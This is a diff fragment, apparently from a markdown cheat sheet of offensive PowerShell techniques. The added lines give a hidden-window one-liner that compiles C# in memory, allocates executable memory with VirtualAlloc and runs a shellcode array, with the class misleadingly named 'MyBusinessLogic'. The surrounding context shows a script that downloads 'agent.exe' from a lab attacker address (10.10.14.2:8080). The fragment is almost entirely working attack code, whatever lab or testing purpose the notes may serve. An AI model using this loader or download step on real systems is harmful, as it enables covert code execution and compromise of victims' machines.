@@ -81,6 +81,13 @@ public class Zz {
 ```
 
 ```powershell
+powershell -nop -w hidden -c "$c='using System;using System.Runtime.InteropServices;public class MyBusinessLogic{static byte[] b=new byte[80895]{ <shellcode> };[DllImport(\"kernel32.dll\")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint m);[UnmanagedFunctionPointer(CallingConvention.StdCall)]delegate void W();public static void Main(){IntPtr p=VirtualAlloc(IntPtr.Zero,Convert.ToUInt32(b.Length),0x1000,0x40);Marshal.Copy(b,0x0,p,b.Length);W r=Marshal.GetDelegateForFunctionPointer<W>(p);r();}}';Add-Type $c;[MyBusinessLogic]::Main()"
+
+```
+
+---
+
+```powershell
 # Define variables
 $url = "http://10.10.14.2:8080/agent.exe"
 $exeName = "agent.exe"
